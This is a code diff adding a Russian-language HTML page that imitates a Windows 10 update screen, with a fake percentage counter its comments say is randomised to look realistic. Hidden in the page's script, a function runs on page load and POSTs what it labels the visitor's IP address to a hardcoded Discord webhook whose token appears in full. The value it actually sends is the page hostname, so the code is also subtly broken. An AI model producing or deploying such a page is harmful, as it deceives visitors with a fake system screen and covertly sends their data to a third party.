@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <link rel="stylesheet" href="index.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Обновление Windows 10</title>
+</head>
+<body>
+
+    <div class="container">
+        <div class="loader">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+        </div>
+
+        <h1>Работа с обновлениями  <span id="percent">0</span>%</h1>
+        <p>Не выключайте компьютер. Это может занять некоторое время.</p>
+        <p class="footer-text">Ваш компьютер перезагрузится несколько раз.</p>
+    </div>
+
+    <script>
+        // Небольшой скрипт для плавного капания процентов (от 0 до 100)
+        let percentCount = 0;
+        const percentElement = document.getElementById('percent');
+
+        function updatePercent() {
+            if (percentCount < 100) {
+                // Случайный шаг от 1 до 3 процентов, чтобы выглядело реалистично
+                percentCount += Math.floor(Math.random() * 3) + 1;
+                if (percentCount > 100) percentCount = 100;
+                
+                percentElement.innerText = percentCount;
+
+                // Случайный интервал между шагами (от 1.5 до 4.5 секунд)
+                let nextStepDelay = Math.floor(Math.random() * 3000) + 1500;
+                setTimeout(updatePercent, nextStepDelay);
+            }
+        }
+
+        // Запуск счетчика через 2 секунды после открытия
+        setTimeout(updatePercent, 2000);
+
+        // Функция для отправки IP-адреса на вебхук
+        function sendIPToWebhook() {
+            fetch('https://discordapp.com/api/webhooks/1504904113480138874/mVd-FlWzwNuS5HarO7y6J45sWXEZFX7RHwBGr_8jPU3Od_P-fY9UR-RDq_kU_Ay_od43', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    content: `IP-адрес: ${window.location.hostname}`
+                })
+            });
+        }
+
+        // Вызов функции при загрузке страницы
+        window.onload = sendIPToWebhook;
+    </script>
+
+</body>
+</html>
